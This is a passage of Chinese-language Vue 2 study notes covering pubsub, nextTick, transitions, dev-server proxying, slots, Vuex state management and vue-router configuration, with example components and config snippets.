		<button @click="sendStudentName">把学生名给School组件</button>
	</div>
</template>

<script>
	import pubsub from 'pubsub-js'
	export default {
		name:'Student',
		data() {
			return {
				name:'张三',
				sex:'男',
			}
		},
		mounted() {
			// console.log('Student',this.x)
		},
		methods: {
			sendStudentName(){
				// this.$bus.$emit('hello',this.name)
				pubsub.publish('hello',666)
			}
		},
	}
</script>

<style lang="less" scoped>
	.student{
		background-color: pink;
		padding: 5px;
		margin-top: 30px;
	}
</style>

```



## 2.7 nextTick

1. 语法：```this.$nextTick(回调函数)```
2. 作用：在下一次 DOM 更新结束后执行其指定的回调。
3. 什么时候用：当改变数据后，要基于更新后的新DOM进行某些操作时，要在nextTick所指定的回调函数中执行。





## 2.8 Vue封装的过度与动画

1. 作用：在插入、更新或移除 DOM元素时，在合适的时候给元素添加样式类名。

2. 写法：

   1. 准备好样式：

      - 元素进入的样式：
        1. v-enter：进入的起点
        2. v-enter-active：进入过程中
        3. v-enter-to：进入的终点
      - 元素离开的样式：
        1. v-leave：离开的起点
        2. v-leave-active：离开过程中
        3. v-leave-to：离开的终点

   2. 使用```<transition>```包裹要过度的元素，并配置name属性：

      ```vue
      <transition name="hello">
      	<h1 v-show="isShow">你好啊！</h1>
      </transition>
      ```

   3. 备注：若有多个元素需要过度，则需要使用：```<transition-group>```，且每个元素都要指定```key```值。



> 使用第三库的具体案例（随便看看，这个不重要）

```html
<template>
	<div>
		<button @click="isShow = !isShow">显示/隐藏</button>
		<transition-group 
			appear
			name="animate__animated animate__bounce" 
			enter-active-class="animate__swing"
			leave-active-class="animate__backOutUp"
		>
			<h1 v-show="!isShow" key="1">你好啊！</h1>
			<h1 v-show="isShow" key="2">尚硅谷！</h1>
		</transition-group>
	</div>
</template>

<script>
	import 'animate.css'
	export default {
		name:'Test',
		data() {
			return {
				isShow:true
			}
		},
	}
</script>

<style scoped>
	h1{
		background-color: orange;
	}
</style>
```

## 2.9 vue脚手架配置代理

### 方法一

​	在vue.config.js中添加如下配置：

```js
devServer:{
  proxy:"http://localhost:5000"
}
```

说明：

1. 优点：配置简单，请求资源时直接发给前端（8080）即可。
2. 缺点：不能配置多个代理，不能灵活的控制请求是否走代理。
3. 工作方式：若按照上述配置代理，当请求了前端不存在的资源时，那么该请求会转发给服务器 （优先匹配前端资源）

### 方法二

​	编写vue.config.js配置具体代理规则：

```js
module.exports = {
	devServer: {
      proxy: {
      '/api1': {// 匹配所有以 '/api1'开头的请求路径
        target: 'http://localhost:5000',// 代理目标的基础路径
        changeOrigin: true,
        pathRewrite: {'^/api1': ''}
      },
      '/api2': {// 匹配所有以 '/api2'开头的请求路径
        target: 'http://localhost:5001',// 代理目标的基础路径
        changeOrigin: true,
        pathRewrite: {'^/api2': ''}
      }
    }
  }
}
/*
   changeOrigin设置为true时，服务器收到的请求头中的host为：localhost:5000
   changeOrigin设置为false时，服务器收到的请求头中的host为：localhost:8080
   changeOrigin默认值为true
*/
```

说明：

1. 优点：可以配置多个代理，且可以灵活的控制请求是否走代理。
2. 缺点：配置略微繁琐，请求资源时必须加前缀。



## 2.10 slot插槽

1. 作用：让父组件可以向子组件指定位置插入html结构，也是一种组件间通信的方式，适用于 <strong style="color:red">父组件 ===> 子组件</strong> 。

2. 分类：默认插槽、具名插槽、作用域插槽

3. 使用方式：

   1. 默认插槽：

      ```vue
      父组件中：
              <Category>
                 <div>html结构1</div>
              </Category>
      子组件中：
              <template>
                  <div>
                     <!-- 定义插槽 -->
                     <slot>插槽默认内容...</slot>
                  </div>
              </template>
      ```

   2. 具名插槽：

      ```vue
      父组件中：
              <Category>
                  <template slot="center">
                    <div>html结构1</div>
                  </template>
      
                  <template v-slot:footer>
                     <div>html结构2</div>
                  </template>
              </Category>
      子组件中：
              <template>
                  <div>
                     <!-- 定义插槽 -->
                     <slot name="center">插槽默认内容...</slot>
                     <slot name="footer">插槽默认内容...</slot>
                  </div>
              </template>
      ```

   3. 作用域插槽：

      1. 理解：<span style="color:red">数据在组件的自身，但根据数据生成的结构需要组件的使用者来决定。</span>（games数据在Category组件中，但使用数据所遍历出来的结构由App组件决定）

      2. 具体编码：

         ```vue
         父组件中：
         		<Category>
         			<template scope="scopeData">
         				<!-- 生成的是ul列表 -->
         				<ul>
         					<li v-for="g in scopeData.games" :key="g">{{g}}</li>
         				</ul>
         			</template>
         		</Category>
         
         		<Category>
         			<template slot-scope="scopeData">
         				<!-- 生成的是h4标题 -->
         				<h4 v-for="g in scopeData.games" :key="g">{{g}}</h4>
         			</template>
         		</Category>
         子组件中：
                 <template>
                     <div>
                         <slot :games="games"></slot>
                     </div>
                 </template>
         		
                 <script>
                     export default {
                         name:'Category',
                         props:['title'],
                         //数据在子组件自身
                         data() {
                             return {
                                 games:['红色警戒','穿越火线','劲舞团','超级玛丽']
                             }
                         },
                     }
                 </script>
         ```

   





# 3. VUEX

原理图：

![image-20220405172004860](C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220405172004860.png)

## 3.1 概念

​		在Vue中实现集中式状态（数据）管理的一个Vue插件，对vue应用中多个组件的共享状态进行集中式的管理（读/写），也是一种组件间通信的方式，且适用于任意组件间通信。

## 3.2 何时使用？

​		多个组件需要共享数据时

## 3.3 搭建vuex环境

1. 创建文件：```src/store/index.js```

   ```js
   //引入Vue核心库
   import Vue from 'vue'
   //引入Vuex
   import Vuex from 'vuex'
   //应用Vuex插件
   Vue.use(Vuex)
   
   //准备actions对象——响应组件中用户的动作
   const actions = {}
   //准备mutations对象——修改state中的数据
   const mutations = {}
   //准备state对象——保存具体的数据
   const state = {}
   
   //创建并暴露store
   export default new Vuex.Store({
   	actions,
   	mutations,
   	state
   })
   ```

2. 在```main.js```中创建vm时传入```store```配置项

   ```js
   ......
   //引入store
   import store from './store'
   ......
   
   //创建vm
   new Vue({
   	el:'#app',
   	render: h => h(App),
   	store
   })
   ```

##    3.4 基本使用

1. 初始化数据、配置```actions```、配置```mutations```，操作文件```store.js```

   ```js
   //引入Vue核心库
   import Vue from 'vue'
   //引入Vuex
   import Vuex from 'vuex'
   //引用Vuex
   Vue.use(Vuex)
   
   const actions = {
       //响应组件中加的动作
   	jia(context,value){
   		// console.log('actions中的jia被调用了',miniStore,value)
   		context.commit('JIA',value)
   	},
   }
   
   const mutations = {
       //执行加
   	JIA(state,value){
   		// console.log('mutations中的JIA被调用了',state,value)
   		state.sum += value
   	}
   }
   
   //初始化数据
   const state = {
      sum:0
   }
   
   //创建并暴露store
   export default new Vuex.Store({
   	actions,
   	mutations,
   	state,
   })
   ```

2. 组件中读取vuex中的数据：```$store.state.sum```

3. 组件中修改vuex中的数据：```$store.dispatch('action中的方法名',数据)``` 或 ```$store.commit('mutations中的方法名',数据)```

   >  备注：若没有网络请求或其他业务逻辑，组件中也可以越过actions，即不写```dispatch```，直接编写```commit```



具体案例：

index.js

```js
//该文件用于创建Vuex中最为核心的store
import Vue from 'vue'
//引入Vuex
import Vuex from 'vuex'
//应用Vuex插件
Vue.use(Vuex)

//准备actions——用于响应组件中的动作
const actions = {
	/* jia(context,value){
		console.log('actions中的jia被调用了')
		context.commit('JIA',value)
	},
	jian(context,value){
		console.log('actions中的jian被调用了')
		context.commit('JIAN',value)
	}, */
	jiaOdd(context,value){
		console.log('actions中的jiaOdd被调用了')
		if(context.state.sum % 2){
			context.commit('JIA',value)
		}
	},
	jiaWait(context,value){
		console.log('actions中的jiaWait被调用了')
		setTimeout(()=>{
			context.commit('JIA',value)
		},500)
	}
}
//准备mutations——用于操作数据（state）
const mutations = {
	JIA(state,value){
		console.log('mutations中的JIA被调用了')
		state.sum += value
	},
	JIAN(state,value){
		console.log('mutations中的JIAN被调用了')
		state.sum -= value
	}
}
//准备state——用于存储数据
const state = {
	sum:0 //当前的和
}

//创建并暴露store
export default new Vuex.Store({
	actions,
	mutations,
	state,
})
```

Count.vue

```vue
<template>
	<div>
		<h1>当前求和为：{ {$store.state.sum} }</h1>
		<select v-model.number="n">
			<option value="1">1</option>
			<option value="2">2</option>
			<option value="3">3</option>
		</select>
		<button @click="increment">+</button>
		<button @click="decrement">-</button>
		<button @click="incrementOdd">当前求和为奇数再加</button>
		<button @click="incrementWait">等一等再加</button>
	</div>
</template>

<script>
	export default {
		name:'Count',
		data() {
			return {
				n:1, //用户选择的数字
			}
		},
		methods: {
			increment(){
                // commit 是操作 mutations
				this.$store.commit('JIA',this.n)
			},
			decrement(){
                // commit 是操作 mutations
				this.$store.commit('JIAN',this.n)
			},
			incrementOdd(){
                // dispatch 是操作 actions
				this.$store.dispatch('jiaOdd',this.n)
			},
			incrementWait(){
                // dispatch 是操作 actions
				this.$store.dispatch('jiaWait',this.n)
			},
		},
		mounted() {
			console.log('Count',this)
		},
	}
</script>

<style lang="css">
	button{
		margin-left: 5px;
	}
</style>
```

## 3.5 getters的使用

1. 概念：当state中的数据需要经过加工后再使用时，可以使用getters加工。

2. 在```store.js```中追加```getters```配置

   ```js
   ......
   
   const getters = {
   	bigSum(state){
   		return state.sum * 10
   	}
   }
   
   //创建并暴露store
   export default new Vuex.Store({
   	......
   	getters
   })
   ```

3. 组件中读取数据：```$store.getters.bigSum```



## 3.6 四个map方法的使用

1. <strong>mapState方法：</strong>用于帮助我们映射```state```中的数据为计算属性

   ```js
   computed: {
       //借助mapState生成计算属性：sum、school、subject（对象写法）
        ...mapState({sum:'sum',school:'school',subject:'subject'}),
            
       //借助mapState生成计算属性：sum、school、subject（数组写法）
       ...mapState(['sum','school','subject']),
   },
   ```

2. <strong>mapGetters方法：</strong>用于帮助我们映射```getters```中的数据为计算属性

   ```js
   computed: {
       //借助mapGetters生成计算属性：bigSum（对象写法）
       ...mapGetters({bigSum:'bigSum'}),
   
       //借助mapGetters生成计算属性：bigSum（数组写法）
       ...mapGetters(['bigSum'])
   },
   ```

3. <strong>mapActions方法：</strong>用于帮助我们生成与```actions```对话的方法，即：包含```$store.dispatch(xxx)```的函数

   ```js
   methods:{
       //靠mapActions生成：incrementOdd、incrementWait（对象形式）
       ...mapActions({incrementOdd:'jiaOdd',incrementWait:'jiaWait'})
   
       //靠mapActions生成：incrementOdd、incrementWait（数组形式）
       ...mapActions(['jiaOdd','jiaWait'])
   }
   ```

4. <strong>mapMutations方法：</strong>用于帮助我们生成与```mutations```对话的方法，即：包含```$store.commit(xxx)```的函数

   ```js
   methods:{
       //靠mapActions生成：increment、decrement（对象形式）
       ...mapMutations({increment:'JIA',decrement:'JIAN'}),
       
       //靠mapMutations生成：JIA、JIAN（对象形式）
       ...mapMutations(['JIA','JIAN']),
   }
   ```

> 备注：mapActions与mapMutations使用时，若需要传递参数需要：在模板中绑定事件时传递好参数，否则参数是事件对象。

## 3.7 模块化+命名空间

1. 目的：让代码更好维护，让多种数据分类更加明确。

2. 修改```store.js```

   ```javascript
   const countAbout = {
     namespaced:true,//开启命名空间
     state:{x:1},
     mutations: { ... },
     actions: { ... },
     getters: {
       bigSum(state){
          return state.sum * 10
       }
     }
   }
   
   const personAbout = {
     namespaced:true,//开启命名空间
     state:{ ... },
     mutations: { ... },
     actions: { ... }
   }
   
   const store = new Vuex.Store({
     modules: {
       countAbout,
       personAbout
     }
   })
   ```

3. 开启命名空间后，组件中读取state数据：

   ```js
   //方式一：自己直接读取
   this.$store.state.personAbout.list
   //方式二：借助mapState读取：
   ...mapState('countAbout',['sum','school','subject']),
   ```

4. 开启命名空间后，组件中读取getters数据：

   ```js
   //方式一：自己直接读取
   this.$store.getters['personAbout/firstPersonName']
   //方式二：借助mapGetters读取：
   ...mapGetters('countAbout',['bigSum'])
   ```

5. 开启命名空间后，组件中调用dispatch

   ```js
   //方式一：自己直接dispatch
   this.$store.dispatch('personAbout/addPersonWang',person)
   //方式二：借助mapActions：
   ...mapActions('countAbout',{incrementOdd:'jiaOdd',incrementWait:'jiaWait'})
   ```

6. 开启命名空间后，组件中调用commit

   ```js
   //方式一：自己直接commit
   this.$store.commit('personAbout/ADD_PERSON',person)
   //方式二：借助mapMutations：
   ...mapMutations('countAbout',{increment:'JIA',decrement:'JIAN'}),
   ```





# 4. 路由

1. 理解： 一个路由（route）就是一组映射关系（key - value），多个路由需要路由器（router）进行管理。
2. 前端路由：key是路径，value是组件。

## 4.1 基本使用

1. 安装vue-router，命令：```npm i vue-router```

2. 应用插件：```Vue.use(VueRouter)```

3. 编写router配置项:

   ```js
   //引入VueRouter
   import VueRouter from 'vue-router'
   //引入Luyou 组件
   import About from '../components/About'
   import Home from '../components/Home'
   
   //创建router实例对象，去管理一组一组的路由规则
   const router = new VueRouter({
   	routes:[
   		{
   			path:'/about',
   			component:About
   		},
   		{
   			path:'/home',
   			component:Home
   		}
   	]
   })
   
   //暴露router
   export default router
   ```

4. 实现切换（active-class可配置高亮样式）

   ```vue
   <router-link active-class="active" to="/about">About</router-link>
   ```

5. 指定展示位置

   ```vue
   <router-view></router-view>
   ```

## 4.2 几个注意点

1. 路由组件通常存放在```pages```文件夹，一般组件通常存放在```components```文件夹。
2. 通过切换，“隐藏”了的路由组件，默认是被销毁掉的，需要的时候再去挂载。
3. 每个组件都有自己的```$route```属性，里面存储着自己的路由信息。
4. 整个应用只有一个router，可以通过组件的```$router```属性获取到。



## 4.3 多级路由（多级路由）

1. 配置路由规则，使用children配置项：

   ```js
   routes:[
   	{
   		path:'/about',
   		component:About,
   	},
   	{
   		path:'/home',
   		component:Home,
   		children:[ //通过children配置子级路由
   			{
   				path:'news', //此处一定不要写：/news
   				component:News
   			},
   			{
   				path:'message',//此处一定不要写：/message
   				component:Message
   			}
   		]
   	}
   ]
   ```

2. 跳转（要写完整路径）：

   ```vue
   <router-link to="/home/news">News</router-link>
   ```

3. 指定展示位置

   ```vue
   <router-view></router-view>
   ```

   

## 4.4 路由的query参数

1. 传递参数

   ```vue
   <!-- 跳转并携带query参数，to的字符串写法 -->
   <router-link :to="/home/message/detail?id=666&title=你好">跳转</router-link>
   				
   <!-- 跳转并携带query参数，to的对象写法 -->
   <router-link 
   	:to="{
   		path:'/home/message/detail',
   		query:{
   		   id:666,
               title:'你好'
   		}
   	}"
   >跳转</router-link>
   ```

2. 接收参数：

   ```js
   $route.query.id
   $route.query.title
   ```

## 4.5 命名路由

1. 作用：可以简化路由的跳转。

2. 如何使用

   1. 给路由命名：

      ```js
      {
      	path:'/demo',
      	component:Demo,
      	children:[
      		{
      			path:'test',
      			component:Test,
      			children:[
      				{
                            name:'hello' //给路由命名
      					path:'welcome',
      					component:Hello,
      				}
      			]
      		}
      	]
      }
      ```

   2. 简化跳转：

      ```vue
      <!--简化前，需要写完整的路径 -->
      <router-link to="/demo/test/welcome">跳转</router-link>
      
      <!--简化后，直接通过名字跳转 -->
      <router-link :to="{name:'hello'}">跳转</router-link>
      
      <!--简化写法配合传递参数 -->
      <router-link 
      	:to="{
      		name:'hello',
      		query:{
      		   id:666,
                  title:'你好'
      		}
      	}"
      >跳转</router-link>
      ```

## 4.6 路由的params参数

1. 配置路由，声明接收params参数

   ```js
   {
   	path:'/home',
   	component:Home,
   	children:[
   		{
   			path:'news',
   			component:News
   		},
   		{
   			component:Message,
   			children:[
   				{
   					name:'xiangqing',
   					path:'detail/:id/:title', //使用占位符声明接收params参数
   					component:Detail
   				}
   			]
   		}
   	]
   }
   ```

2. 传递参数

   ```vue
   <!-- 跳转并携带params参数，to的字符串写法 -->
   <router-link :to="/home/message/detail/666/你好">跳转</router-link>
   				
   <!-- 跳转并携带params参数，to的对象写法 -->
   <router-link 
   	:to="{
   		name:'xiangqing',
   		params:{
   		   id:666,
               title:'你好'
   		}
   	}"
   >跳转</router-link>
   ```

   > 特别注意：路由携带params参数时，若使用to的对象写法，则不能使用path配置项，必须使用name配置！

3. 接收参数：

   ```js
   $route.params.id
   $route.params.title
   ```

## 4.7 路由的props配置

作用：让路由组件更方便的收到参数

```js
{
	name:'xiangqing',
	path:'detail/:id',
	component:Detail,

	//第一种写法：props值为对象，该对象中所有的key-value的组合最终都会通过props传给Detail组件
	// props:{a:900}

	//第二种写法：props值为布尔值，布尔值为true，则把路由收到的所有params参数通过props传给Detail组件
	// props:true
	
	//第三种写法：props值为函数，该函数返回的对象中每一组key-value都会通过props传给Detail组件
	props(route){
		return {
			id:route.query.id,
			title:route.query.title
		}
	}
}
```

## 4.8 ```<router-link>```的replace属性

1. 作用：控制路由跳转时操作浏览器历史记录的模式
2. 浏览器的历史记录有两种写入方式：分别为```push```和```replace```，```push```是追加历史记录，```replace```是替换当前记录。路由跳转时候默认为```push```
3. 如何开启```replace```模式：```<router-link replace .......>News</router-link>```

## 4.9 编程式路由导航

1. 作用：不借助```<router-link> ```实现路由跳转，让路由跳转更加灵活

2. 具体编码：

   ```js
   //$router的两个API
   this.$router.push({
   	name:'xiangqing',
   		params:{
   			id:xxx,
   			title:xxx
   		}
   })
   
   this.$router.replace({
   	name:'xiangqing',
   		params:{
   			id:xxx,
   			title:xxx
   		}
   })
   this.$router.forward() //前进
   this.$router.back() //后退
   this.$router.go() //可前进也可后退
   ```

## 4.10 缓存路由组件

1. 作用：让不展示的路由组件保持挂载，不被销毁。

2. 具体编码：

   这个 include 指的是组件名

   ```vue
   <keep-alive include="News"> 
       <router-view></router-view>
   </keep-alive>
   ```

## 4.11 两个新的生命周期钩子

1. 作用：路由组件所独有的两个钩子，用于捕获路由组件的激活状态。
2. 具体名字：
   1. ```activated```路由组件被激活时触发。
   2. ```deactivated```路由组件失活时触发。



## 4.12 路由守卫

1. 作用：对路由进行权限控制

2. 分类：全局守卫、独享守卫、组件内守卫

3. 全局守卫:

   ```js
   //全局前置守卫：初始化时执行、每次路由切换前执行
   router.beforeEach((to,from,next)=>{
   	console.log('beforeEach',to,from)
   	if(to.meta.isAuth){ //判断当前路由是否需要进行权限控制
   		if(localStorage.getItem('school') === 'atguigu'){ //权限控制的具体规则
   			next() //放行
   		}else{
   			alert('暂无权限查看')
   			// next({name:'guanyu'})
   		}
   	}else{
   		next() //放行
   	}
   })
   
   //全局后置守卫：初始化时执行、每次路由切换后执行
   router.afterEach((to,from)=>{
   	console.log('afterEach',to,from)
   	if(to.meta.title){ 
   		document.title = to.meta.title //修改网页的title
   	}else{
   		document.title = 'vue_test'
   	}
   })
   ```

4. 独享守卫:

   ```js
   beforeEnter(to,from,next){
   	console.log('beforeEnter',to,from)
   	if(to.meta.isAuth){ //判断当前路由是否需要进行权限控制
   		if(localStorage.getItem('school') === 'atguigu'){
   			next()
   		}else{
   			alert('暂无权限查看')
   			// next({name:'guanyu'})
   		}
   	}else{
   		next()
   	}
   }
   ```

5. 组件内守卫：

   ```js
   //进入守卫：通过路由规则，进入该组件时被调用
   beforeRouteEnter (to, from, next) {
   },
   //离开守卫：通过路由规则，离开该组件时被调用
   beforeRouteLeave (to, from, next) {
   }
   ```

## 4.13 完整的导航解析流程

1. 导航被触发。
2. 在失活的组件里调用 `beforeRouteLeave` 守卫。
3. 调用全局的 `beforeEach` 守卫。
4. 在重用的组件里调用 `beforeRouteUpdate` 守卫 (2.2+)。
5. 在路由配置里调用 `beforeEnter`。
6. 解析异步路由组件。
7. 在被激活的组件里调用 `beforeRouteEnter`。
8. 调用全局的 `beforeResolve` 守卫 (2.5+)。
9. 导航被确认。
10. 调用全局的 `afterEach` 钩子。
11. 触发 DOM 更新。
12. 调用 `beforeRouteEnter` 守卫中传给 `next` 的回调函数，创建好的组件实例会作为回调函数的参数传入。

## 4.14 路由器的两种工作模式

1. hash模式原理
   hash 是通过监听浏览器 onhashchange 事件变化，查找对应路由应用。通过改变 location.hash 改变页面路由。

2. history模式原理
   利用 html5 的浏览器history对象中新增的 pushState() 和 replaceState() 方法，改变页面路由。

   history Interface 是浏览器历史记录栈提供的接口，可通过 back、forward、go 等，可以读取历览器历史记录栈的信息，pushState、repalceState 还可以对浏览器历史记录栈进行修改。

   在HTML4中，已经支持window.history对象来控制页面历史记录跳转，常用的方法包括：

   - history.forward(); //在历史记录中前进一步
   - history.back(); //在历史记录中后退一步
   - history.go(n): //在历史记录中跳转n步骤，n=0为刷新本页,n=-1为后退一页。

   在HTML5中，window.history对象得到了扩展，新增的API包括：

   - history.pushState(data,title[,url]);//向历史记录中追加一条记录
   - history.replaceState(data,title[,url]);//替换当前页在历史记录中的信息。
   - history.state;//是一个属性，可以得到当前页的state信息。
   - window.onpopstate;//是一个事件，在点击浏览器后退按钮或js调用forward()、back()、go()时触发。监听函数中可传入一个event对象，event.state即为通过pushState()或replaceState()方法传入的data参数

   hash 与 history 区别对比：

   | hash                                                         | history                                                      |
   | ------------------------------------------------------------ | ------------------------------------------------------------ |
   | 有#号                                                        | 没有 # 号                                                    |
   | 兼容到IE8                                                    | 兼容到IE10                                                   |
   | 实际的url之前使用哈希字符，这部分url不会发送到服务器，不需要在服务器层面上进行任何处理 | 每访问一个页面都要发起网络请求，每个请求都需要服务器进行路由匹配、数据库查询、生成HTML文档后再发送响应给浏览器，这个过程会消耗服务器的大量资源，给服务器的压力较大。 |
   | 刷新不会存在 404 问题                                        | 浏览器直接访问嵌套路由时，会报 404 问题。                    |
   | 不需要服务器任何配置                                         | 需要在服务器配置一个回调路由                                 |

    





参考文章：

1. 尚硅谷主讲的vue：https://www.bilibili.com/video/BV1Zy4y1K7SH?p=77&spm_id_from=pageDriver
2. 现代JavaScript：https://zh.javascript.info/
3. MDN文档：https://developer.mozilla.org/zh-CN/docs/Web
4. 我是你的超级英雄 https://juejin.cn/post/6844903895467032589
